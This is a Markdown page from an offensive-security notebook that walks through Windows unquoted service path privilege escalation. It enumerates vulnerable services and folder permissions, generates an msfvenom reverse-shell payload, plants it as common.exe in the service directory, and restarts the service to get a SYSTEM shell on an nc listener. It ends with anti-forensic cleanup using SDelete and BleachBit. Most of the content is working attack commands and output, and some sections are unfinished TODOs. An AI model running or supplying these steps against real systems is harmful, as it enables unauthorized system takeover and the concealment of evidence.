# Living off the Land

Unquoted service path that is a binary path doesn't contain the quotes (`"`) to treats it as an absolute path which can make the service to be mislead to a malicious binary process when it's possible to override the service.

## 01 - Enumerate

### 1.1 - Query Services

#### 1.1.1 - Command Prompt

TODO: Rewrite use WHERE clause to remove the quotes and reveal `"C:\Program Files"` as the path

```
C:\> wmic service get name,startname,pathname,startmode where pathname like 'LocalSystem' | findstr /i "c:\program files" | findstr /i /v """
AWSLiteAgent                              C:\Program Files\Amazon\XenTools\LiteAgent.exe                                     Auto       LocalSystem                  
unquotedsvc                               C:\Program Files\Unquoted Path Service\Common Files\unquotedpathservice.exe        Manual     LocalSystem                  
winexesvc                                 winexesvc.exe                                                                      Manual     LocalSystem
```

#### 1.1.2 - PowerShell

TODO: Include the output

```
PS C:\> Get-WmiObject -ClassName Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq "Auto" -and $_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'} | Select-Object PathName,DisplayName,Name

PS C:\> Get-CimInstance -ClassName Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq "Auto" -and $_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'} | Select-Object PathName,DisplayName,Name
```

### 1.2 - Enumerate Vulnerable Services

#### 1.2.1 - Command Prompt

As I have previously explained from the [[06 - Tactics & Techniques & Procedures (TTPs) Phases/F - Post Exploitation/0x02 - Privilege Escalation/Windows/Local Privilege Escalation/Vulnerable Software/Service Exploits/Insecure Service Permission/Living off the Land|Insecure Service Paths]] section after the discovering the services. There isn't much to say to further confirm it that contains the previous to further verify it's vulnerable but to the **Unquoted Service Path** and the realistic scenario it might not be accessible to the **Users** group to `start` or `stop` the service via `sc.exe` or `net.exe` if it does not have the **BUILTIN\\Users:(I)(RX)** permissions except that it might have either **full access `(BUILTIN\Users:(F)`** or **`BUILTIN\Users:(I)(F))`**, write access **`(BUILTIN\Users:(W)`**, or **`BUILTIN\Users:(I)(W))`**.

This is what it looks like to grant write access for the **Users** group with the following command:

```
C:\> icacls "C:\Program Files\Service name\service.exe" /grant "BUILTIN\Users":W
processed file: C:\Program Files\Service name\service.exe
Succesfully processed 1 files; Failed processing 0 files
```

So what you should look out is that the **`Unquoted Service Path`** that it is configured to **`Auto`** start the service that the computer needed to be rebooted as I explained on the previous privilege escalation technique.

```
C:\> sc qc unquotedsvc
[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: unquotedsvc
        TYPE               : 10  WIN32_OWN_PROCESS 
        START_TYPE         : 3   DEMAND_START
        ERROR_CONTROL      : 1   NORMAL
        BINARY_PATH_NAME   : C:\Program Files\Unquoted Path Service\Common Files\unquotedpathservice.exe
        LOAD_ORDER_GROUP   : 
        TAG                : 0
        DISPLAY_NAME       : Unquoted Path Service
        DEPENDENCIES       : 
        SERVICE_START_NAME : LocalSystem
```

After running the `icacls` command the surprising thing of what it stands out that we have full access permission that displays with **`BUILTIN\Users:(F)`** meaning the attacker can copy the malware and insert into that particular folder to execute it.

```
C:\> icacls "C:\Program Files\Unquoted Path Service"
C:\Program Files\Unquoted Path Service BUILTIN\Users:(F)
                                       NT SERVICE\TrustedInstaller:(I)(F)
                                       NT SERVICE\TrustedInstaller:(I)(CI)(IO)(F)
                                       NT AUTHORITY\SYSTEM:(I)(F)
                                       NT AUTHORITY\SYSTEM:(I)(OI)(CI)(IO)(F)
                                       BUILTIN\Administrators:(I)(F)
                                       BUILTIN\Administrators:(I)(OI)(CI)(IO)(F)
                                       BUILTIN\Users:(I)(RX)
                                       BUILTIN\Users:(I)(OI)(CI)(IO)(GR,GE)
                                       CREATOR OWNER:(I)(OI)(CI)(IO)(F)
                                       APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES:(I)(RX)
                                       APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES:(I)(OI)(CI)(IO)(GR,GE)
                                       APPLICATION PACKAGE AUTHORITY\ALL RESTRICTED APPLICATION PACKAGES:(I)(RX)
                                       APPLICATION PACKAGE AUTHORITY\ALL RESTRICTED APPLICATION PACKAGES:(I)(OI)(CI)(IO)(GR,GE)

Successfully processed 1 files; Failed processing 0 files
```

#### 1.2.2 - PowerShell

```
PS C:\> get-service unquotedsvc | format-list


Name                : unquotedsvc
DisplayName         : Unquoted Path Service
Status              : Stopped
DependentServices   : {}
ServicesDependedOn  : {}
CanPauseAndContinue : False
CanShutdown         : False
CanStop             : False
ServiceType         : Win32OwnProcess
```

When running the powershell cmdlet we have `BUILTIN\Users Allow FullControl` indicates that the users have full access in other words the attacker can copy the malware and insert into that particular folder to execute it

```
PS C:\> get-acl "C:\Program Files\Unquoted Path Service" | fl


Path   : Microsoft.PowerShell.Core\FileSystem::C:\Program Files\Unquoted Path Service
Owner  : BUILTIN\Administrators
Group  : WIN-QBA94KB3IOF\None
Access : BUILTIN\Users Allow  FullControl
         NT SERVICE\TrustedInstaller Allow  FullControl
         NT SERVICE\TrustedInstaller Allow  268435456
         NT AUTHORITY\SYSTEM Allow  FullControl
         NT AUTHORITY\SYSTEM Allow  268435456
         BUILTIN\Administrators Allow  FullControl
         BUILTIN\Administrators Allow  268435456
         BUILTIN\Users Allow  ReadAndExecute, Synchronize
         BUILTIN\Users Allow  -1610612736
         CREATOR OWNER Allow  268435456
         APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES Allow  ReadAndExecute, Synchronize
         APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES Allow  -1610612736
         APPLICATION PACKAGE AUTHORITY\ALL RESTRICTED APPLICATION PACKAGES Allow  ReadAndExecute, Synchronize
         APPLICATION PACKAGE AUTHORITY\ALL RESTRICTED APPLICATION PACKAGES Allow  -1610612736
Audit  : 
Sddl   : O:BAG:S-1-5-21-3025105784-3259396213-1915610826-513D:AI(A;;FA;;;BU)(A;ID;FA;;;S-1-5-80-956008885-3418522649-18
         31038044-1853292631-2271478464)(A;CIIOID;GA;;;S-1-5-80-956008885-3418522649-1831038044-1853292631-2271478464)(
         A;ID;FA;;;SY)(A;OICIIOID;GA;;;SY)(A;ID;FA;;;BA)(A;OICIIOID;GA;;;BA)(A;ID;0x1200a9;;;BU)(A;OICIIOID;GXGR;;;BU)(
         A;OICIIOID;GA;;;CO)(A;ID;0x1200a9;;;AC)(A;OICIIOID;GXGR;;;AC)(A;ID;0x1200a9;;;S-1-15-2-2)(A;OICIIOID;GXGR;;;S-
         1-15-2-2)
```

```
PS C:\> $acl = get-acl "C:\Program Files\Unquoted Path Service"
PS C:\> convertfrom-sddlstring -sddl $acl.sddl | foreach-object {$_.DiscretionaryAcl}
BUILTIN\Users: AccessAllowed (ChangePermissions, CreateDirectories, Delete, DeleteSubdirectoriesAndFiles, ExecuteKey, FullControl, FullControl, FullControl, FullControl, FullControl, GenericAll, GenericExecute, GenericRead, GenericWrite, ListDirectory, Modify, Read, ReadAndExecute, ReadAttributes, ReadExtendedAttributes, ReadPermissions, Synchronize, TakeOwnership, Traverse, Write, WriteAttributes, WriteData, WriteExtendedAttributes, WriteKey)
NT SERVICE\TrustedInstaller: AccessAllowed Inherited (ChangePermissions, CreateDirectories, Delete, DeleteSubdirectoriesAndFiles, ExecuteKey, FullControl, FullControl, FullControl, FullControl, FullControl, GenericAll, GenericExecute, GenericRead, GenericWrite, ListDirectory, Modify, Read, ReadAndExecute, ReadAttributes, ReadExtendedAttributes, ReadPermissions, Synchronize, TakeOwnership, Traverse, Write, WriteAttributes, WriteData, WriteExtendedAttributes, WriteKey)
NT AUTHORITY\SYSTEM: AccessAllowed Inherited (ChangePermissions, CreateDirectories, Delete, DeleteSubdirectoriesAndFiles, ExecuteKey, FullControl, FullControl, FullControl, FullControl, FullControl, GenericAll, GenericExecute, GenericRead, GenericWrite, ListDirectory, Modify, Read, ReadAndExecute, ReadAttributes, ReadExtendedAttributes, ReadPermissions, Synchronize, TakeOwnership, Traverse, Write, WriteAttributes, WriteData, WriteExtendedAttributes, WriteKey)
BUILTIN\Administrators: AccessAllowed Inherited (ChangePermissions, CreateDirectories, Delete, DeleteSubdirectoriesAndFiles, ExecuteKey, FullControl, FullControl, FullControl, FullControl, FullControl, GenericAll, GenericExecute, GenericRead, GenericWrite, ListDirectory, Modify, Read, ReadAndExecute, ReadAttributes, ReadExtendedAttributes, ReadPermissions, Synchronize, TakeOwnership, Traverse, Write, WriteAttributes, WriteData, WriteExtendedAttributes, WriteKey)
BUILTIN\Users: AccessAllowed Inherited (GenericWrite, ListDirectory, Read, ReadAndExecute, ReadAttributes, ReadExtendedAttributes, ReadPermissions, Synchronize, Traverse)
APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES: AccessAllowed Inherited (GenericWrite, ListDirectory, Read, ReadAndExecute, ReadAttributes, ReadExtendedAttributes, ReadPermissions, Synchronize, Traverse)
APPLICATION PACKAGE AUTHORITY\ALL RESTRICTED APPLICATION PACKAGES: AccessAllowed Inherited (GenericWrite, ListDirectory, Read, ReadAndExecute, ReadAttributes, ReadExtendedAttributes, ReadPermissions, Synchronize, Traverse)
```

#### 1.2.3 - Sysinternals

TODO: Fill in the output

```
C:\> .\PsService64.exe -accepteula query unquotedsvc

C:\> .\PsService64.exe config unquotedsvc

C:\> .\PsService64.exe security unquotedsvc
```

Of course in order to verify even further to use it as future reference. When running with accesschk.exe we can see **`RW BUILTIN\Users`** group that contains two letters and they are **`R` (read)** and **`W` (write)**. It is confirmed we can hijack this **`Unquoted Service Path`** without including the quotes and it will lead right back to our reverse shell with a suitable in order for this service to recognize it.

```
C:\> accesschk.exe -accepteula -uwdq "C:\Program Files\Unquoted Path Service\"
C:\Program Files\Unquoted Path Service
  Medium Mandatory Level (Default) [No-Write-Up]
  RW BUILTIN\Users
  RW NT SERVICE\TrustedInstaller
  RW NT AUTHORITY\SYSTEM
  RW BUILTIN\Administrators
```

## 02 - Exploit

### 2.1 - Generate Payload

Let's copy our payload directly to the folder. You may notice that I've typed it without the capitals. During the MS DOS era, Windows operating systems can read the letters case insensitive. Also if you look closely about the reverse that was copied and renamed as `common.exe` that is because it is "unquoted" service the service will not execute the absolute path `C:\Program Files\Unquoted Path Service\Common Files\`. This will make Windows to accept the bogus program and run it anyways.

```
$ msfvenom -p windows/x64/shell_reverse_tcp lhost=<IP> lport=53 -f exe-service -o payload.exe

$ sudo nc -lnvp 53
```

### 2.2 - Copy Payload To Vulnerable Directory

#### 2.2.1 - Command Prompt

```
C:\> copy payload.exe "c:\program files\unquoted path service\common.exe"
```

#### 2.2.2 - PowerShell

```
PS C:\> Copy-Item .\payload.exe "c:\program files\unquoted path service\common.exe"
```

### 2.3 - Restart Service

#### 2.2.1 - Net Command

##### 2.2.1.1 - Command Prompt

```
C:\> net.exe continue unquotedsvc

C:\> net.exe stop unquotedsvc & net start unquotedsvc
```

#### 2.2.2 - SCManager

```
C:\> sc.exe continue unquotedsvc

C:\> sc.exe stop unquotedsvc & sc.exe start unquotedsvc
```

#### 2.2.3 - PowerShell Cmdlet

```
PS C:\> Restart-Service unquotedsvc

PS C:\> Stop-Service unquotedsvc; Start-Service unquotedsvc
```

#### 2.2.4 - Windows Management Instrumentation

##### 2.2.4.1 - Command Prompt

```
C:\> wmic.exe unquotedsvc call startservice
```

##### 2.2.4.2 - PowerShell

```
PS C:\> Get-CimInstance -Class Win32_Service -Filter "Name='unquotedsvc'" | ForEach-Object { $_.StartService() }

PS C:\> Get-WmiObject -Class Win32_Service -Filter "Name='unquotedsvc'" | ForEach-Object { $_.StartService() }
```

#### 2.2.5 - Sysinternals

```
C:\> .\PsService64.exe restart unquotedsvc

C:\> .\PsService64.exe stop unquotedsvc & .\PsService64.exe start unquotedsvc
```

Once the payload has been executed you can see an incoming connection.

```
$ sudo nc -lnvp 53
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::53
Ncat: Listening on 0.0.0.0:53
Ncat: Connection from 10.10.186.48.
Ncat: Connection from 10.10.186.48:49859.
Microsoft Windows [Version 10.0.17763.737]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\System32> whoami
nt authority\system
```

## 03 - Cleanup

Let's remove our payload after we're elevated to continue on during the post exploitation phases.

### 3.1 - Command Prompt

```
C:\Windows\system32> del "c:\program files\unquoted path service\common.exe"
```

### 3.2 - PowerShell

```
PS C:\Windows\system32> Remove-Item -Force "c:\program files\unquoted path service\common.exe"
```

### 3.3 - Sysinternals

```
C:\Windows\system32> .\SDelete64.exe -p 5 "c:\program files\unquoted path service\common.exe"
```

### 3.4 - Third Party

```
C:\Windows\system32> .\bleachbit_console.exe -s "c:\program files\unquoted path service\common.exe"
```

---
## References

### Backlinks

- [[06 - Tactics & Techniques & Procedures (TTPs) Phases/F - Post Exploitation/0x01 - Defense Evasion/12 - Anti-Forensics/Windows/Clear Traces/01 - Remove Artifacts/Secure Delete Files/Manual/Living off the Land|Defense Evasion: Sysinterals - Secure Delete Files]]

- [[06 - Tactics & Techniques & Procedures (TTPs) Phases/F - Post Exploitation/0x01 - Defense Evasion/12 - Anti-Forensics/Windows/Clear Traces/01 - Remove Artifacts/Secure Delete Files/Manual/Third Party|Defense Evasion: Third Party - Secure Delete Files]]

### Hacktricks

- [Hacktricks: Privileged Groups](https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/privileged-groups-and-token-privileges.html)

### Red Team Notes

- [Red Team Notes: Privilege Escalation Unquoted Service Paths](https://www.ired.team/offensive-security/privilege-escalation/unquoted-service-paths)

### Internal All The Things

- [Internal All The Things: Windows Privilege Escalation](https://swisskyrepo.github.io/InternalAllTheThings/redteam/escalation/windows-privilege-escalation/)

### SumitVerma101

- [SumitVerma101: Windows Privilege Escalation Part 1 Unquoted Service Path](https://medium.com/@SumitVerma101/windows-privilege-escalation-part-1-unquoted-service-path-c7a011a8d8ae)